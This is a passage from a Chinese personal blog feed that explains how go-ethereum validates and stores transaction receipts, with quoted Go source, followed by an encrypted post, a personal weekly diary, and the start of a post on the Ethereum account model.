data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-4.png#clientId=u9ae9216b-af72-4&from=paste&height=359&id=u9d6c0d41&margin=%5Bobject%20Object%5D&originHeight=718&originWidth=642&originalType=url&status=done&style=none&taskId=u780e7386-1eaa-45c3-a6fc-2cdef063091&width=321"></p><h2 id="交易回执共识信息"><a href="#交易回执共识信息" class="headerlink" title="交易回执共识信息"></a>交易回执共识信息</h2><p>共识意味在在校验区块合法性时，这部分信息也参与校验。这些信息参与校验的原因是确保交易必须在区块中的固定顺序中执行，且记录了交易执行后的状态信息。这样可强化交易顺序。</p><ul><li>Status： 成功与否，1 表示成功，0 表示失败。</li><li>CumulativeGasUsed： 区块中已执行的交易累计消耗的 Gas，包含当前交易。</li><li>Logs: 当前交易执行所产生的智能合约事件列表。</li><li>Bloom：是从 Logs 中提取的事件布隆过滤器，用于快速检测某主题的事件是否存在于 Logs 中。</li></ul><p><strong>如何参与共识校验呢</strong>？<br>实际上<strong>参与校验</strong>的<strong>仅仅是回执哈希</strong>，而<strong>回执哈希</strong>计算<strong>只包含这些信息</strong>。<br>首先，在校验时获取整个区块回执信息的默克尔树的根哈希值。再判断此哈希值是否同区块头定义内容相同。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/block_validator.go:92</span></span><br><span class="line">receiptSha := types.DeriveSha(receipts)</span><br><span class="line"><span class="keyword">if</span> receiptSha != header.ReceiptHash &#123;</span><br><span class="line">   <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid receipt root hash (remote: %x local: %x)&quot;</span>,</span><br><span class="line">   header.ReceiptHash, receiptSha)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而函数 types.DeriveSha 中<strong>生成根哈希值</strong>，是将列表元素（这里是<strong>交易回执</strong>）的<strong>RLP 编码信息</strong>构成<strong>默克树</strong>，最终获得列表的哈希值。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/types/derive_sha.go:32</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DeriveSha</span><span class="params">(list DerivableList)</span> <span class="title">common</span>.<span class="title">Hash</span></span> &#123;</span><br><span class="line">   keybuf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">   trie := <span class="built_in">new</span>(trie.Trie)</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; list.Len(); i++ &#123;</span><br><span class="line">      keybuf.Reset()</span><br><span class="line">      rlp.Encode(keybuf, <span class="keyword">uint</span>(i))</span><br><span class="line">      trie.Update(keybuf.Bytes(), list.GetRlp(i))</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> trie.Hash()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// core/types/receipt.go:237</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Receipts)</span> <span class="title">GetRlp</span><span class="params">(i <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">   bytes, err := rlp.EncodeToBytes(r[i])</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续往下看，交易回执实现了 RLP 编码接口。在方法 EncodeRLP 中是构建了一个私有的 receiptRLP。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/types/receipt.go:119</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span> <span class="title">EncodeRLP</span><span class="params">(w io.Writer)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> rlp.Encode(w,</span><br><span class="line">&amp;receiptRLP&#123;r.statusEncoding(), r.CumulativeGasUsed, r.Bloom, r.Logs&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中可以看出 receiptRLP 仅仅包含上面提到的参与共识校验的内容。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/types/receipt.go:78</span></span><br><span class="line"><span class="keyword">type</span> receiptRLP <span class="keyword">struct</span> &#123;</span><br><span class="line">   PostStateOrStatus []<span class="keyword">byte</span></span><br><span class="line">   CumulativeGasUsed <span class="keyword">uint64</span></span><br><span class="line">   Bloom             Bloom</span><br><span class="line">   Logs              []*Log</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="交易回执交易信息"><a href="#交易回执交易信息" class="headerlink" title="交易回执交易信息"></a>交易回执交易信息</h2><p>这部分信息记录的是关于回执所对应的交易信息，有：</p><ul><li>TxHash ： 交易回执所对应的交易哈希。</li><li>ContractAddress： 当这笔交易是部署新合约时，记录新合约的地址。</li><li>GasUsed: 这笔交易执行所消耗的<a href="https://learnblockchain.cn/books/geth/part1/gas.html">Gas 燃料</a>。</li></ul><p>这些信息不参与共识的原因是这三项信息已经在其他地方校验。</p><ul><li>TxHash: 区块有校验交易集的正确性。</li><li>ContractAddress： 如果是新合约，实际上已经提交到以太坊状态 State 中。</li><li>GasUsed： 已属于 CumulativeGasUsed 的一部分。</li></ul><h2 id="交易回执区块信息"><a href="#交易回执区块信息" class="headerlink" title="交易回执区块信息"></a>交易回执区块信息</h2><p>这部分信息完全是<strong>为了方便外部读取交易回执</strong>，不但知道交易执行情况，<strong>还能方便的指定该交易属于哪个区块中第几笔交易</strong>。</p><ul><li>BlockHash: <strong>交易所在区块哈希</strong>。</li><li>BlockNumber: <strong>交易所在区块高度</strong>。</li><li>TransactionIndex：<strong>交易在区块中的序号</strong>。</li></ul><p>这三项信息，主要是<strong>在数据库 Leveldb 中读取交易回执</strong>时，<strong>实时指定</strong>。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/rawdb/accessors_chain.go:315</span></span><br><span class="line">receipts := <span class="built_in">make</span>(types.Receipts, <span class="built_in">len</span>(storageReceipts))</span><br><span class="line">logIndex := <span class="keyword">uint</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i, receipt := <span class="keyword">range</span> storageReceipts &#123;</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">   receipts[i] = (*types.Receipt)(receipt)</span><br><span class="line">   receipts[i].BlockHash = hash</span><br><span class="line">   receipts[i].BlockNumber = big.NewInt(<span class="number">0</span>).SetUint64(number)</span><br><span class="line">   receipts[i].TransactionIndex = <span class="keyword">uint</span>(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="交易回执存储"><a href="#交易回执存储" class="headerlink" title="交易回执存储"></a>交易回执存储</h2><p><strong>交易回执</strong>作为<strong>交易执行中间产物</strong>，为了方便快速获取某笔交易的执行明细。以太坊中有跟随区块存储时实时存储交易回执。但为了降低存储量，只存储了必要内容。<br>首先，在<strong>存储</strong>时，将交易回执对象转换为<strong>精简内容</strong>。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/rawdb/accessors_chain.go:338</span></span><br><span class="line">storageReceipts := <span class="built_in">make</span>([]*types.ReceiptForStorage, <span class="built_in">len</span>(receipts))</span><br><span class="line"><span class="keyword">for</span> i, receipt := <span class="keyword">range</span> receipts &#123;</span><br><span class="line">   storageReceipts[i] = (*types.ReceiptForStorage)(receipt)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>精简内容是专门为存储定义的一个结构 ReceiptForStorage。存储时将交易回执集进行 RLP 编码存储。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/rawdb/accessors_chain.go:342</span></span><br><span class="line">bytes, err := rlp.EncodeToBytes(storageReceipts)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   log.Crit(<span class="string">&quot;Failed to encode block receipts&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := db.Put(blockReceiptsKey(number, hash), bytes); err != <span class="literal">nil</span> &#123;</span><br><span class="line">   log.Crit(<span class="string">&quot;Failed to store block receipts&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以看存储了哪些内容，只需要看 ReceiptForStorage 的 EncodeRLP 方法：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/types/receipt.go:179</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *ReceiptForStorage)</span> <span class="title">EncodeRLP</span><span class="params">(w io.Writer)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">   enc := &amp;receiptStorageRLP&#123;</span><br><span class="line">      PostStateOrStatus: (*Receipt)(r).statusEncoding(),</span><br><span class="line">      CumulativeGasUsed: r.CumulativeGasUsed,</span><br><span class="line">      TxHash:            r.TxHash,</span><br><span class="line">      ContractAddress:   r.ContractAddress,</span><br><span class="line">      Logs:              <span class="built_in">make</span>([]*LogForStorage, <span class="built_in">len</span>(r.Logs)),</span><br><span class="line">      GasUsed:           r.GasUsed,</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> i, log := <span class="keyword">range</span> r.Logs &#123;</span><br><span class="line">      enc.Logs[i] = (*LogForStorage)(log)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> rlp.Encode(w, enc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-5.png#clientId=u9ae9216b-af72-4&from=paste&height=482&id=u14eddb16&margin=%5Bobject%20Object%5D&originHeight=746&originWidth=854&originalType=url&status=done&style=none&taskId=ubb7522ff-0229-47a2-8673-79e407e628c&width=552"></p><h1 id="交易回执示例–文档参考"><a href="#交易回执示例–文档参考" class="headerlink" title="交易回执示例–文档参考"></a>交易回执示例–文档参考</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-6.png#clientId=u9ae9216b-af72-4&from=paste&height=737&id=u301c1b6f&margin=%5Bobject%20Object%5D&originHeight=1474&originWidth=1664&originalType=url&status=done&style=none&taskId=u1730403f-a93e-4126-920d-39990df7fdc&width=832"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;全局结构&quot;&gt;&lt;a href=&quot;#全局结构&quot; class=&quot;headerlink&quot; title=&quot;全局结构&quot;&gt;&lt;/a&gt;全局结构&lt;/h1&gt;&lt;p&gt;下图是以太坊区块数据结构与关系。&lt;br&gt;&lt;img src= &quot;/img/loading</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>流量在线识别系统demo</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/20/%E6%B5%81%E9%87%8F%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9Fdemo_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/20/%E6%B5%81%E9%87%8F%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9Fdemo_new/</id>
    <published>2021-04-20T07:13:42.000Z</published>
    <updated>2021-06-21T06:41:53.909Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9422fa806c25e7d58e0067bc1326e0a24a90816ece815c0b65b082a6e9b66385">7a27311b6b2cd1a21889c25f42783ffe4f9a32211aa3e3e4c19ef8ed59d1827283d5421fe472fe4b7f35f73b07945e464e34189aba4887343b0bbc49264ef710bf94373d34a783aa80f376a37cfaa4489a2ecb2c6343f4a296a02b275c45f13a5a28b93b0d2564f039bfcbfadf0bde518ab29fdaafa9e2cb94d6fdbe5e4cec62e4b72dd6f26966c8a288702c70679166cb169247e2b6bf99792238dd4a3619c5e788d529ad5e58bab285c0a32a4605bd2f43671f2a643f2dd5d994e20922cf09226ea850583b561b67fe9c59adbf0c8fd31a25a4fa6772a3149ad5044188540278e013247bd03ce1d6e8963977b91362fcef63d430eab09a0e70f6cba1284d84368e1647a00d3f1be3d665c80bb77f6ac5d6f6e719fc32bd29bca39ef84be2dc6c13f87a3699d457fdd6d16c03fc668132ade68839495f15b14273562aa8afd86c16696acfac72cf07796ef10dcf96686bbde3cd020b066d51e6c68ba6f1b1689ffd19d00484aa2b56fbe14394eb62927b987f355d8c2dbac2c184075ec77f61215df23a8ecfe06b239f8e955db3e3fc74fdea0aab51802ab4e9dbfe39dbc56c998f467fec59437af891bffe049d70379ffdb199a36689463b69a015bafff1df1af6b4e17202783fb70036a2d727dc0ea84c46d228f130a0488b5f3206cf4d71200716337a90d2831529617992f5cfb513dd5ec4dbb273001df911b1b65edbbe1fbdc0fb53950136a386efc3cf78866180740daf2be9c56b7102d480ee8662c596fc4bf8ffe806f96963bfdf74a79f1464648256744e3570e654b1530e9598908219055e6bbf0c36ec0bad029a777d7c7b1094f2f4cc7cd94033ffbec4915620c0e44fb6798300968c34c6decf3763c3afe65521b7d47999599621dc652f1467760b94308c5d457033344fa899674d60aa120099d5fc9a59bab1b1ec425e72356847b56583677c477b7366d3d56338e0396ff80f813f2278b4a8530d5172d13270591643199fbaf56dbcc5e2090de52d7466ad78271e330a8a075077dc30861ba3ed955dfb7faf4fe8196675b16a360fbf7664882638d1ee3eeb93cff517a20935ff238ea4a76f6c8e3ecdd00f4d041e4ba3f09e78b7df2872f2d137de061a0a599f3331469df053652de08f88c7372fb90073d4957a4b5af852ec3d9f615f42307df6bad8f9d1b1772012b36a248ea2ef646c0cca0e4270a7f6d6149d7a5c856c44042d7fa45377d10eaa9e82f2d9c2b02aff994a2707dc98a5580d4d106b3215181529734dddff3852d0eff9a9dd2b263ddf96d5eb6ec9784dbfebd09970fb164b9de9567a9438e0238044561fe6bcdc14ba0abd1e4f719555fdcdeaf3bf7ab0a03b5cdb9cde88d180dfa015803b7d89c0f5b84911ec2c34b2669fa12cf96de7396b84c1f3aedfd07f1e4d690ad540844348c8bd4efeaa67aedb7a4f44f50faf329f5bd152d9d911263f8fe71f18790c20e373d456345c31c517710ac61a02684d5a87fa45dfe0c0e9f2f333ecaee3ef668ee0a461d56894b0369fb20e3c259218a51deec0fec09f0eebae31b3fb86a35d1e23f9c5679788ed26613cd52f8d11dec1cadf604c867e697ec4bbf79ce459e1c9682487246ef5d154cc30e2e22d1d7a0ef400d60f664ffc77b789c451c2674e885c22d80180f926949ab8641e508861a0c1af4a80c790f99cbedb723289471b21e6cdd2211901b9abe26c04d2e07754ec4f3bf0533c76439c68b414bc1787f133fd8a41edf7727eda12879715446c406060fad90dcd11750c7523016c37f0bddd201bf704ea053f645ea00179503dba899b78dc79707f5e5e8be86d66b5c81f5cb51ed1a8762ca275c8885b73616349a710672425a5e0e50bbdd52d460330bd3fbff82fcbf350986a0c26678c7c97210e2ac84ca8648114d4a12ad157ec0ef21640f00c03151e4f256da814e932eea85fd98d2310a12b6731348de1fd1b0c4e79e97caf40deadb46ead8fcf2aed1ff661ce8e9d86051785e007331052e5376d67ca126881e1a369fb4cb5b32b4f1c8b320765966c8491a0d4a811d3982489aa378600136d91ee880622fa935abb7157b73f02f501a8198232bb938163601fb278e14acb7f5495ee266b90d13c70d904e51299e49de42bfa5438a77eaadd22d1fbce0c9ca4c90cac031714b9c7c12851e3247b8764a3a7aa1f5dd9e4595c8c1af2be9f24f80a59ed7ee089fc45225025fe7b12d657d58b96729a53180de7a6ae5f43c609b2a9fbf9d0e2e8d9b4f5e70aa9a7a628693d8c13e3676d984bbc05969d7a6e1116d0073727226b689fecbbf41d01c749d1dcba746fc29ac87dc48d0e83af30881d3742783fa46fc822042241461c069b26d582d597d87d7adfa480c0c1cd7035dcb641ab267fc995bf604fcb5b1b35344909f8be3904d69daebefc15ea18edfc27e441d729b38c24f79955d17d69195f4185dece33a64f6a95edd65e32a4efa721a9355378c5aa6f30e8200620ff1095acd000b4030e151a7b4e6e5f18524c28d618167b1b63a3ec0a8ace41156dc1194a0a95b4210f98451290f891fba0dcf8e9bfaa6d7dc80bbab0d608f81c38d4d21d9c4e55efe4fac2525602fde7832196ceab1b8c7d2ffd6de723190192430278e5f2187946dc94715540df5cfb01161ef55acf2628466bc051a424cf4c6a52404468a90c6a2998defa0a0bf708c8cfb7ab7a182f4d7714054d9234941db204e13cfa3490531e8ffe27d1461330999f0afbc57f2e6729c86f0f9117f838385c28e6914d261fc561c54057d8c111476f0bdd0487e4977b838110e287727f7b3d725c7d4fac0b5af5d01e8c2a86d61e2c22b145d156fe28e667e517cb4fd1dc9fc6ee601cf4f6a5e5fed7e88a2dfb52ec9d40004307866df2399e95db0332e12cbd37cbec98b8d242dfd2551c220fcb7cd5a187e56d8e7957290275456557d987cab1a0b80f33180f0064b776e2de65f51d9bd73bfdbfe6597c2593063d11af73b1c4d7ef7e5c69631358af42e5ac93b53c71da9caf14dd29d99e095ab5b87572a93c8c5556357507ca5f158bb94782f3166213e0c8e0bb42ccae1eefc69f75c5f9c4d775bc31ca7f419e74ef9e43243d8480ce934d83b9d80cc392a694b9239d978895472328407629a34d39000365796d2c8eecf86b67aeb14cfcd148e5235de8479200ff94f1724c411351cde7067319b8f3a6531b00f02968e4df856d89c13d3954adcf1a4b72074ea86bc2c644b6a2bb80ba8b961959b1e2c85d6e166d4bb096b995abe0f46c3cf367a6c1857fc030cfbf25dc6e2115f42a6fa3bf70fb605f28f37cbe4bcb23800ab6852f7a69ce1a16d94f2e85c6b57671488f0314726b3bd2c1e663fe11d6f675fcbcfb291cd299851a7e832df89ca42cd7b782ba93ccc78583850f2f644c1bc76d39e3e85aea821314c15dad2e40704011bcde9d529a557a6900dd0bb65eb88ec7f12af96696d0b61f7830fd15d40f1073eb41b30487c5ffa638489b29e43896475808139386ab18bc734a82b06e9b593347faa05ace68645a6c0f23c51ca0c65504a396c83a1a6f9c322472908c44f15bbc791654b0799c481c550a52e2f4ab067f2daa223d6bccab0ff8406de2207755b7fb20adf94bcb91cd4e65cc85d1df05afb80c44ceb094b72cc7998811f9216c90b945df7dc5a20091e602af1f5dfd66c10b823ffa1b479fd5a1caa2fe764adffda4719e8aa11ad7fe07224ea2eb4b984b5e68e968c96baeeed74ca40e58dd7b88af95921208b603cdabb9a401b7cb197a52d93a9fa690e2ba5e0c414cbcd6af99ee9cd214e7f9a051ba76fa6fb0e17297d249307c05411549bf8d83a7cd64c65c675b5857ec9453264ebd804c412059d6876f0ba6bed704ece6efa4b15da6a8d785d75c63580d474f9ca462ed167972127430a73154b68a777ebeb7e4a92ceadcd0bdc59479d5e2afb8309f0ed1faf36b77d3fd18206b23641337acb66d66ea9c459e5a4b3907d4d39662545839926c277db973a25d7cea9dc2738517c2db08727112061fd7c3090ab8a0e6e6af80abdcf635ff72a219cafd068c47a5248a5f62f878205b80a58d64eaa225533eafc49cad194c455c8a46f4475a6a9578cbf819f75d3b245ffff226349065d0d9a1848148bcb781b08f90122da8d9b6742ab1e3b74d7c6c6f275303db06233a63da1ba02577ef100fb374895ed88ec9b63f62b1c063563fb101ee4bd98776d3855c105a130c95386c8df277c66a7d0b7b9ee5e41d67016eb199b43bbf16a0de9d51abe22a8d19c7bef70a56704de22de6d0984d1cba8352bb9886e17ce716591c5906a9a63dca3b0e7bcde01de167f69ac66b68ce9d235abfc75d90c2f8e560e9ff41828d32d8607249f90ef5a9f2e0dbaa73a1326d72e1eeba39540c9c77a093b76165e118956ace6510771d02a5b8a5395d39f8b2abf1549a0dce1428c9f914f2f82184790f114daf1b85fe97c71443eb2006dd759c0da7d2925921d7757ea5d81311b83a2ffa057e276e5dfc61aff01405de03ad025ef25dd7f581d002739639aa2ca0b50538bbe33f5897f0fcce8575a72a04a7e775c620aa63eacefd9866fc4bb04ca62ec79f8e986826a5e34b801976cb5d3c4b7111b1c34674b1000a8a032eacba3649053b6c95530f1951796c54acaff28eb76cc1eda68133c377b591d741df6e2a6d79209d7c2bbbc830c8c953ffc8fb848163a7b1f43016cf4244688e62355eec880e1f4b73aa20a37110ddfccb7006c407f9b4930e623fad19b6ce965839f9d72fef106fd62f48dcd499e73d77a5cf037c752c537efa22086a0640b513776d5fb5ddebf8b8e1d616fa7c62ca1b00cb9424e621aa69398acdaf4e0c278079ba12bf18f35b69f419495b893542f897f292e47b4607995a087c4d506f2a931ec4d9a40f4fdd4a49b8e54ac54f9f1a5a777940fbd39ff4197e6abd2b65de4d7817049a65ff238436ae9f6a66c9302b33890e39ccb71dcd340b63bb682b0b72c9ecac843981c8941df1c62cebbb7d188312c6ab547717e74b76da16d266e2bcdb97070ae2ea596f8bb02c5afaf4d7ab8d4a8598e451e03cd89f371d06c1e996a516dc5f78e98016b802f836ed401b17a4bc622719b6ac79347b3b15e69dab2c5ad88b03cc3bb75f07921cdeba5cb961580d4f0e9789ca8a6feac5cd0189521380e4fa064dd9efee24a8ec08cf52ee304292208a5c73b17a7d6bd8c878831a8c2ff3b624d0e3d68238714835fbdf4a4547727e1cf1cb09ec1b044d5df531f030a5d62abc36c44ada5d9bad0a44ae558497eae8d57a4cd91b1595e88c1d26b9f8e526b24e782686a0b151708d7350df950980721b25bef892cd02fa2c8cbf13f6cc68dc74c8c9381c474f961e4c03e9218c7430ab9e63615b9d353e3886bdf5734aef0ce588740e7bcc9182fbec4b2031e17c488c9f8c896227f5d38ad6f6409b43c9eb09a568111eed2d78c28c853270a7466bbee19e4b26328f2eec728f5dbd821fdcbc9852845b9b24b912e4e417c574cd93dc487e9f3d3f43ec22b957ca3d6c58b0899dcb9a9da85ba89e8a572100562e8be03fbe30a79b1332b0bcbcf580846e5763dc59a51abfeaad21a5a90d2eec329c8e31b9806b32dd4157222cf963d8fa688830d2b90786492bf10cc97704405da0bd419897de80cda077166789e249017c0b1e4100889e02c5a48b9ffa9e9d52eeb2bde8c5035311b80f6860d3e911b1cbabd161c96af6c27e3fc4c59defbbd0c8ef26a1b022efbe04e0254db380aa7eded9277d0da974b50344bfa371852a66c13318213a0b24ca55f3cdd3fb6f2add424dc2d59ce360c80b490f03394df96ffb1b7aa530acc1feb53a72325e41a4e96b30632fc1724c0d0e8b9d24e31de921897c2bbf4ec1f31a873eac8cbc47d1374a86c90c8d53be917c9a7ac46c675a1d42b8c32e2fa17e0dba644bc2e7c5e22f23afbbcb04c05ec0ed269cc26a3ddbe846209ba09e6440301f0616bfaa61dad9be0efb538ad2d6c18f476cc447b922421fed0a62ac98a5c1b3350e50b4f42f4bb8685e3b78e0da7ec61529117b01b4a4444fd7e271a6c6c46e386ab1e4f16e7d0f29df767fb8428603c23e13f9d964fb5676ddd299f94303a49781562733c5aa7b00a0a28736e90313c45eb8581a8b80d1aad3347146398efe818dd41096256bc2b0a335e40737c51a1446108b42f7b59a6249098a12d009df5ee8238b6ff11bab46f949e4ab2740a3477a072ca6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Life-Weekly-April-19-to-25</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/20/Life-Weekly-April-19-to-25_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/20/Life-Weekly-April-19-to-25_new/</id>
    <published>2021-04-20T06:52:36.000Z</published>
    <updated>2021-06-21T06:38:17.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>特斯拉最近一直出事故，脚刹系统很有问题，怀疑是软件 bug，官方售后居然在发生事故后会清除事故数据和行车记录视频，这是一个负责任的大公司能干出的事吗？</li><li>特斯拉疑似提供事故数据，数据不规范，传感器数量明显不对，搁这儿欺骗消费者呢？</li><li>中国派巴基斯坦大使下榻酒店遭恐怖袭击，中方人员外出会谈，无人员受伤。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>周一：下雨，被学长鸽了，让我自己写在线系统，麻了。拖了一个月到比赛截至的时候说自己没写。行吧，我自己写。</li><li>周二：下雨，加油！</li><li>周三：校运会==放假，写完了！</li><li>周四：买了一把胜利 CHA-9500 球拍和尤尼克斯的手胶，开始准备认真打羽毛球了！</li><li>周五：通过考核，成为预备党员！美赛又是 M 奖，淦，再也不玩了！学校咋都 2O 19F，卷疯了。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>算法好文</li><li>羽毛球训练好文</li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>伍六七终于到主线了！！！！何导啊何导，有青山老贼那味了，希望别一部国漫画 10 年就行，追起来太费劲了。</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-19-to-25-1.jpeg#clientId=u67cebdca-6850-4&from=drop&id=ufaa1c361&margin=%5Bobject%20Object%5D&name=IMG_20210421_225640.jpg&originHeight=1067&originWidth=1940&originalType=binary&size=344924&status=done&style=none&taskId=u7e240ddf-325a-4031-8b88-95b8b3a8a4f" alt="IMG_20210421_225640.jpg"><br><strong>只攻不守的剑，也能用来保护人</strong>。</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>关于恋爱观。</li></ol><p>「<strong>交往</strong>」这件事，不只是为了休息日能一起去哪玩，那只是附带的东西罢了。[<strong>互相支撑着对方的生活</strong>」才是交往的本质。<br>能互相给予对方“<strong>在看不见的地方让自己的生活变得丰富</strong>”这样的力量，这才是“交往”。就算不能时时刻刻在一起，但却能带给自己仿佛在一起时一般的存在感的人，这才是“恋人”。<br>真正的谈恋爱是两个人相处比我独处更有趣、更有意义，真正的谈恋爱是两个人为了未来而考虑、努力，真正的恋爱是我愿意支持你的想法，你愿意鼓励我主动追梦，真正的恋爱是时间沉淀感情后、冷静思考后的坚定选择。无关激素，无关冲动，不是想谈恋爱而找个人谈恋爱，而是我们经历了很多事情后，我们了解彼此后，选择了彼此。</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>软件安全的 ret2libc 要自学一下了！</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>做人做事</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-19-to-25-2.png#clientId=u67cebdca-6850-4&from=paste&height=1443&id=u062f504b&margin=%5Bobject%20Object%5D&originHeight=2885&originWidth=720&originalType=url&status=done&style=none&taskId=uc553a112-4017-49b5-b30d-b410852a388&width=360"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;特斯拉最近一直出事故，脚刹系统很有问题，怀疑是软件 bug，官方售后居然在发生事故后会清除事故数据和行车记录视频，这是一个负责任</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>区块链底层-账户模型</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B_new/</id>
    <published>2021-04-17T14:32:44.000Z</published>
    <updated>2021-06-21T06:38:22.514Z</updated>
    
    <content type="html"><![CDATA[<p>我们采用和以太坊相似的账户模型。</p><a id="more"></a><h1 id="账户数据结构"><a href="#账户数据结构" class="headerlink" title="账户数据结构"></a>账户数据结构</h1><p>以太坊数据以账户为单位组织，账户数据的变更引起账户状态变化, 从而引起以太坊状态变化。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core/state/state_object.go:100</span></span><br><span class="line"><span class="keyword">type</span> Account <span class="keyword">struct</span> &#123;</span><br><span class="line">    Nonce    <span class="keyword">uint64</span></span><br><span class="line">    Balance  *big.Int</span><br><span class="line">    Root     common.Hash</span><br><span class="line">    CodeHash []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在密码学领域，Nonce 代表一个只使用一次的数字。它往往是一个随机或伪随机数，以避免重复。 以太坊账户中加入 Nonce，可避免重放攻击（不过不是随机产生）。账户 Nonce 起始值是 0，后续每触发一次账户执行则 Nonce 值计加一次。 其中一处的计数逻辑如下：</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 